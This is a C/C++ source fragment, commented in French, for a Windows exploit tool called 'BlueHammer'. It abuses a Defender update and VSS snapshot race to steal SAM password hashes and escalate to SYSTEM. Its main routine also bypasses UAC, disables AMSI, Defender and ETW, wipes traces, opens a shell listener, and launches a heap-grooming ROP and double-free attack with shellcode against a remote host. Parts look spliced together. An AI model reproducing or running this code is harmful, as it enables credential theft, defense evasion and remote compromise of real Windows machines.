    if (!GetProcAddress(hNtdll, "NtDuplicateToken")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateProcessEx")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateThread")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtTerminateProcess")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtTerminateThread")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtReadVirtualMemory")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtWriteVirtualMemory")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtProtectVirtualMemory")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtFlushInstructionCache")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtGetWriteWatch")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtResetWriteWatch")) {
        return FALSE;

    }

    
    if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
        return FALSE;

    }

    if (!InitNtApis()) {
        CoUninitialize();
        return FALSE;

    }

    return TRUE;

}

BOOL InitializeCommon() {
    if (!InitGlobalState()) {
        return FALSE;

    }
    return TRUE;

}

BOOL InitializeVSS() {
    if (!VssInitialize()) {
        return FALSE;

    }
    return TRUE;

}

BOOL InitializeUpdateAgent() {
    if (!UpdateAgentInitialize()) {
        return FALSE;

    }
    return TRUE;

}

BOOL InitializeCloudFiles() {
    if (!CloudFilesInitialize()) {
        return FALSE;

    }
    return TRUE;

}

BOOL InitializeRaceCondition() {
    if (!RaceConditionInitialize()) {
        return FALSE;

    }
    return TRUE;

}

BOOL InitializeSAM() {
    if (!SAMInitialize()) {
        return FALSE;

    }
    return TRUE;

}

BOOL InitializeBlueHammer() {
    CLEANUP_STATE cleanup = {0};
    BOOL bSuccess = FALSE;

    
    if (!InitializeCommon()) {
        printf("[-] BlueHammer: Common initialization failed\n");

        goto cleanup;
    }

    if (!InitializeVSS()) {
        printf("[-] BlueHammer: VSS initialization failed\n");

        goto cleanup;
    }

    if (!InitializeUpdateAgent()) {
        printf("[-] BlueHammer: Update Agent initialization failed\n");

        goto cleanup;
    }

    if (!InitializeCloudFiles()) {
        printf("[-] BlueHammer: Cloud Files initialization failed\n");

        goto cleanup;
    }

    if (!InitializeRaceCondition()) {
        printf("[-] BlueHammer: Race Condition initialization failed\n");

        goto cleanup;
    }

    if (!InitializeSAM()) {
        printf("[-] BlueHammer: SAM initialization failed\n");

        goto cleanup;
    }

    // Initialisation COM
    if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
        printf("[-] BlueHammer: COM initialization failed\n");

        goto cleanup;
    }
    cleanup.bCoInit = TRUE;

    
    printf("[+] BlueHammer Stage 1: Downloading Defender Signature Update...\n");

    CAB_FILE* pCabFiles = NULL;
    if (!DownloadDefenderUpdate(&pCabFiles)) {
        printf("[-] BlueHammer Stage 1 Failed: Could not download Defender update\n");

        goto cleanup;
    }

    // Préparation du répertoire de mise à jour
    if (!PrepareUpdateDirectory(pCabFiles, cleanup.wszUpdateDir)) {
        printf("[-] BlueHammer Stage 1 Failed: Could not prepare update directory\n");

        FreeCabFiles(pCabFiles);
        goto cleanup;
    }

    // Nettoyage des fichiers cabinet (plus besoin après extraction)
    FreeCabFiles(pCabFiles);
    pCabFiles = NULL;

    
    printf("[+] BlueHammer Stage 2: Triggering VSS Snapshot via EICAR...\n");

    wcscpy_s(cleanup.wszEicarPath, MAX_PATH, EICAR_DROP_PATH);
    if (!DropEicar(cleanup.wszEicarPath)) {
        printf("[-] BlueHammer Stage 2 Failed: Could not drop EICAR file\n");

        goto cleanup;
    }
    cleanup.bEicarDropped = TRUE;

    WCHAR wszVSSDevice[MAX_PATH] = {0};
    if (!MonitorVSSCreation(wszVSSDevice, VSS_TIMEOUT_MS)) {
        printf("[-] BlueHammer Stage 2 Failed: VSS snapshot not created within timeout\n");

        goto cleanup;
    }
    cleanup.bVSSInitialized = TRUE;

    
    printf("[+] BlueHammer Stage 3: Setting up Cloud Files callbacks...\n");

    if (!RegisterCloudFilterCallback(&cleanup.pCfCtx)) {
        printf("[!] BlueHammer Stage 3 Warning: Could not register Cloud Files callback (continuing anyway)\n");

        // On continue même si ça échoue (le Stage 4 peut réussir sans)
    }

   
    printf("[+] BlueHammer Stage 4: Exploiting TOCTOU race condition...\n");

    // Rollback de l'engin Defender pour s'assurer que la mise à jour est valide
    if (!RollbackDefenderEngine()) {
        printf("[!] BlueHammer Stage 4 Warning: Defender engine rollback failed (continuing anyway)\n");

    }

    WCHAR wszLeakedFile[MAX_PATH] = {0};
    if (!ExecuteRace(cleanup.wszUpdateDir, wszVSSDevice, L"\\Windows\\System32\\config\\SAM", wszLeakedFile)) {
        printf("[-] BlueHammer Stage 4 Failed: TOCTOU race did not succeed\n");

        goto cleanup;
    }

    
    printf("[+] BlueHammer Stage 5: Dumping SAM hashes...\n");

    SAM_DUMP_RESULT samResult = {0};
    if (!DumpSAMHashes(wszLeakedFile, &samResult)) {
        printf("[-] BlueHammer Stage 5 Failed: Could not dump SAM hashes\n");

        goto cleanup;
    }

    // Affichage des hashs extraits
    printf("[+] BlueHammer: SAM Hashes Dumped (%u users):\n", samResult.dwUserCount);

    for (DWORD i = 0; i < samResult.dwUserCount; i++) {
        if (samResult.Users[i].bHashValid) {
            printf("  RID: %-6u | User: %-24S | NTHash: ",
                samResult.Users[i].dwRid,
                samResult.Users[i].wszUsername);

            for (int j = 0; j < 16; j++) {
                printf("%02X", samResult.Users[i].bNTHash[j]);
            }
            printf(" | LMHash: ");
            for (int j = 0; j < 16; j++) {
                printf("%02X", samResult.Users[i].bLMHash[j]);
            }
            printf("\n");

        }
    }

   
    printf("[+] BlueHammer Stage 6: Escalating to NT AUTHORITY\\SYSTEM...\n");

    if (!EscalateAll(&samResult, TEMP_PASSWORD)) {
        printf("[-] BlueHammer Stage 6 Failed: Could not escalate privileges\n");

        goto cleanup;
    }

    printf("[+] BlueHammer: Successfully escalated to SYSTEM!\n");

    bSuccess = TRUE;

cleanup:
    DoCleanupImpl(&cleanup);
    return bSuccess;

}

=
int main(int argc, char* argv[]) {
    printf("[+] Initializing BlueHammer layer...\n");

    // Initialisation des stubs NT et de BlueHammer
    if (!InitializeNtStubs()) {
        printf("[-] Failed to initialize NT stubs\n");

        return 1;

    }

    if (!InitializeBlueHammer()) {
        printf("[-] Failed to initialize BlueHammer\n");

        return 1;

    }

    printf("[+] Successfully running as SYSTEM\n");

    if ((IsElevated())) {
        std::cout << "Target path: ";
        std::string path;
        std::getline(std::cin, path);
        std::cout << "Target Program: " << path << std::endl;
        char pathtofile[MAX_PATH];
        strcpy_s(pathtofile, MAX_PATH, path.c_str());
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "open";
        sei.lpFile = pathtofile;
        sei.hwnd = NULL;
        sei.nShow = SW_SHOWNORMAL;
        sei.lpParameters = "/k";
        ShellExecuteExA(&sei);
        system("pause");

    } else {
        if (GetOSVersion()) {
            Bypass();

        } else {
            char pathtofile[MAX_PATH];
            HMODULE GetModH = GetModuleHandleA(NULL);
            GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = pathtofile;
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;
            sei.lpParameters = NULL;
            ShellExecuteExA(&sei);

        }
    }

    init_debug_info();
    // --- [EXPERT INITIALIZATION] ---
    ExpertDisableProtections();
    ExpertElevateSystem();
    
    // --- [EXPERT EXPLOITATION] ---
    if (argc >= 2) {
        ExpertTriggerBlueHammer(argv[1], 500);
    }
    
    // --- [EXPERT DATA EXTRACTION] ---
    ExpertExtractSAM(L"C:\\Windows\\Temp\\sam.hive", L"C:\\Windows\\Temp\\system.hive");
    
    // --- [EXPERT CLEANUP] ---
    ExpertWipeTraces();
    

    print_banner();

    if (is_hostile_environment()) {
        printf("[!] Hostile environment detected. Exiting.\n");

        return 1;

    }
    disable_amsi();

    disable_defender();

    disable_etw();

    if (!start_shell_listener()) {
        printf("[!] Failed to start shell listener. Continuing without listener.\n");

    }
    if (argc < 3) {
        print_usage(argv[0]);
        stop_shell_listener();
        return 1;

    }
    strncpy(g_TargetIP, argv[1], sizeof(g_TargetIP) - 1);
    g_TargetPort = (uint16_t)atoi(argv[2]);
    g_GroomConfig.thread_count = HEAP_GROOM_THREADS;
    g_GroomConfig.iterations = DEFAULT_GROOM_ITERATIONS;
    g_GroomConfig.delay_ms = 2000;
    g_GroomConfig.chunk_size = DEFAULT_CHUNK_SIZE;
    g_GroomConfig.min_free_pct = MIN_FREE_PERCENTAGE;
    g_GroomConfig.max_free_pct = MAX_FREE_PERCENTAGE;
    g_Socket = init_udp_socket(0);
    if (g_Socket == INVALID_SOCKET) {
        stop_shell_listener();
        return 1;

    }
    g_Target.sin_family = AF_INET;
    g_Target.sin_port = htons(g_TargetPort);
    if (inet_pton(AF_INET, g_TargetIP, &g_Target.sin_addr) != 1) {
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    if (!test_target_reachability(g_TargetIP, g_TargetPort)) {
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    static const uint8_t default_shellcode[] = {
        0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    uint8_t* shellcode = (uint8_t*)VirtualAlloc(NULL, sizeof(default_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode) {
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    memcpy(shellcode, default_shellcode, sizeof(default_shellcode));
    size_t shellcode_size = sizeof(default_shellcode);
    if (!get_memory_info(&g_MemInfo)) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    if (!init_rop_module(&g_ExploitCtx)) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    if (!find_rop_gadgets(&g_ExploitCtx)) {
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    if (!build_rop_chain(&g_ExploitCtx, &g_RopChain, shellcode, shellcode_size)) {
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    if (!start_heap_grooming(&g_ExploitCtx, g_GroomConfig.thread_count, DEFAULT_CHUNK_SIZE, g_MemInfo.ikeext_base)) {
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    Sleep(2000);
    uint8_t* packets[SKF_FRAGMENTS + 1] = {0};
    size_t packet_lens[SKF_FRAGMENTS + 1] = {0};
    int num_packets = build_exploit_sequence(packets, packet_lens, SKF_FRAGMENTS + 1);
    if (num_packets == 0) {
        stop_heap_grooming();
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    if (!trigger_double_free(g_Socket, &g_Target)) {
        for (int i = 0; i < num_packets; i++) {
            free(packets[i]);
        }
        stop_heap_grooming();
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    Sleep(3000);
    if (!execute_via_rop()) {
        if (!execute_shellcode(shellcode, shellcode_size)) {
            printf("[!] Failed to execute shellcode or ROP chain.\\n");

        }
    }
    for (int i = 0; i < num_packets; i++) {
        free(packets[i]);
    }
    stop_heap_grooming();
    cleanup_rop_module();
    if (shellcode) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
    }
    if (g_Socket != INVALID_SOCKET) {
        closesocket(g_Socket);
        g_Socket = INVALID_SOCKET;
    }
    WSACleanup();
    stop_shell_listener();
    printf("\\n[+] Exploit finished. Press Enter to exit...\\n");

    getchar();
    return 0;

}

// ============================================================================
// LINKER DIRECTIVES - Bibliothèques nécessaires pour Visual Studio
// ============================================================================
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Vssapi.lib")

#pragma comment(lib, "Tlhelp32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
